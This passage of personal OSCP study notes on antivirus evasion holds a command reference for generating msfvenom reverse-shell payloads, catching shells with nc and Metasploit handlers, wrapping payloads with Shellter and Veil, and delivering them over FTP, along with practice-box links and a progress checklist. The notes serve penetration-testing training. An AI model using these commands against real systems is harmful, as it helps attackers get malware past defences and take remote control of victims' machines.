    Q2 -->|Scripts blocked,\n.bat allowed| Veil["Veil .bat wrapper\n(Capstone 2)"]
    PSScript & Shellter & Veil & InMem --> Catch["Catch shell on Kali\n(nc or multi/handler)"]
    style Catch fill:#2e7d32,color:#fff
```

**Further reading:**

> 🔗 **Microsoft Security Blog** — "FinFisher exposed: A researcher's tale of defeating traps, tricks, and complex virtual machines" (search the Microsoft Security Blog directly — deep-links to that blog have historically moved, the article title is stable)

> 🔗 **Emeric Nasi**, "Bypass Antivirus Dynamic Analysis" — search on Google Scholar or ResearchGate for current hosting location; it's been hosted at various URLs over time

> 🔗 **PayloadsAllTheThings** AV bypass index (stable GitHub): [github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass)

> 🔗 **HackTricks** AV bypass techniques (GitHub source, bypasses paywall — search within the repo for "av bypass" to find the current path): [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks)

#### Tags: #Module15Summary #AVEvasionRecap #AntivirusEvasion

---

## 📋 Command Reference: Antivirus Evasion

Generalised, copy-pasteable commands for this whole topic area. Full mechanics and flag-by-flag breakdowns live in the hub docs linked below.

```bash
# --- PowerShell in-memory injection ---

# Generate psh-reflection payload (new random variable names each run)
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f psh-reflection -o bypass.ps1

# Stageless listener (plain nc)
nc -lvnp <port>

# Staged Meterpreter listener
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT <port>; run;"

# On Windows target (PowerShell):
# Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
# .\bypass.ps1

# --- Shellter ---

# Install
sudo apt install shellter wine
sudo dpkg --add-architecture i386 && sudo apt-get update && sudo apt-get install wine32:i386

# Run (interactive wine-based console)
shellter
# A → Auto → path to 32-bit PE → Stealth Mode: Y → payload → LHOST/LPORT

# Verify PE is 32-bit before feeding to Shellter
file target.exe   # must say "PE32" not "PE32+"

# --- Veil ---

# Install
sudo apt install veil
# OR from source:
git clone https://github.com/Veil-Framework/Veil.git ~/Veil
cd ~/Veil && sudo ./config/setup.sh --force --silent

# Run (interactive menu)
veil

# --- FTP file delivery (active mode + binary encoding) ---
ftp <target-ip>
# ftp> passive      (toggle to active if currently in passive)
# ftp> binary       (binary encoding — required for .exe/.bat)
# ftp> put <file>
# ftp> quit

# --- Test VM setup: disable automatic sample submission ---
# PowerShell (admin) on Windows test VM:
# Set-MpPreference -SubmitSamplesConsent 2
```

- **Command Appendix:** [[AV Evasion]] *(to be created during completion pass)*
- **Command Breakdowns:** [[AV Evasion (Breakdowns)]] *(to be created during completion pass)*
- **Decision Tree:** [[AV Evasion (Decision Tree)]] *(to be created during completion pass)*
- **Methodology Cheat Sheet:** [[Windows Methodology]] *(AV Evasion foothold section to be added during completion pass)*
- **Modern Tooling:** no addition for this module. Shellter and Veil are themselves the automation tools for this area, and no faster standalone equivalent to the manual techniques taught exists that isn't a full C2 framework (excluded by Modern Tooling scope). See [[MODERN TOOLING]].

#### Tags: #CommandReference #Module15

---

## 🎯 Related Boxes to Practice

AV evasion is relatively rare as a standalone challenge in OSCP-style CTF boxes. Most lab environments deliberately disable AV to keep focus on exploitation techniques. Genuine practice for this module's specific techniques comes from the module's own capstone VMs, which are harder to replicate in public CTF box form.

For the broader delivery and execution skillset this module feeds into:

**[HTB Devel](https://app.hackthebox.com/machines/Devel)** (Windows, Easy) — Windows IIS box with a file upload path to a shell. No AV evasion required, but the "transfer a payload, trigger execution" workflow is identical to this module's capstone labs. Good for making file-delivery mechanics feel automatic before layering AV bypass on top.

**[HTB Granny](https://app.hackthebox.com/machines/Granny)** (Windows, Easy) — similar IIS/WebDAV delivery workflow. Pairs with Devel as a warm-up for "get a file onto a Windows target and execute it" without the AV complication.

**No confirmed box found** that specifically tests `psh-reflection` or Shellter bypass against a live running AV engine — these techniques appear more in real engagements and in OffSec's own PWK/PG labs than in public HTB-style machines. Worth revisiting if a specific community-flagged box surfaces later.

> 🔗 **ippsec.rocks** — search "antivirus evasion" or "shellter" to find HTB walkthroughs where the technique appeared: [ippsec.rocks](https://ippsec.rocks)

#### Tags: #RelatedBoxes #Module15 #HTBDevel #HTBGranny

---

## **Outstanding Sections**

- [x] **15.1.1 Known vs Unknown Threats:** done (theory, YARA context, EDR framing, diagram added)
- [x] **15.1.2 AV Engines and Components:** done (all 7 engines explained, diagram added)
- [x] **15.1.3 Detection Methods:** done (Q1 & Q2 answered, diagram added), Q3 VirusTotal lab pending VM spin-up ⬜
- [x] **15.2.1 On-disk Evasion:** done (Q1 answered, packer/obfuscator/crypter taxonomy with diagram)
- [x] **15.2.2 In-memory Evasion:** done (Q1 & Q2 answered, all 4 techniques with diagrams)
- [x] **15.3.1 Testing for AV Evasion:** done (best practices, VirusTotal/Kleenscan, test VM setup)
- [x] **15.3.2 Evading AV with Thread Injection:** done (theory, VirtualAlloc Q1 answered, micro-steps written), hands-on against VM #1 pending VM spin-up ⬜
- [x] **15.3.3 Automating AV Evasion with Shellter:** done (theory, Stealth Mode Q1 answered, micro-steps written), Shellter+Spotify hands-on pending ⬜, both capstone labs micro-stepped and pending VM spin-up ⬜
- [x] **15.4 Wrapping Up:** done (summary diagram added, external resources linked)

**Module 15 has NOT yet reached [[feedback_oscp_module_completion_pass]] — all hands-on labs and capstones are pending VM spin-up. Hub docs are untouched for this module's content per [[feedback_oscp_methodology_linking]]'s sequencing (hub doc sync only after module is fully done).**
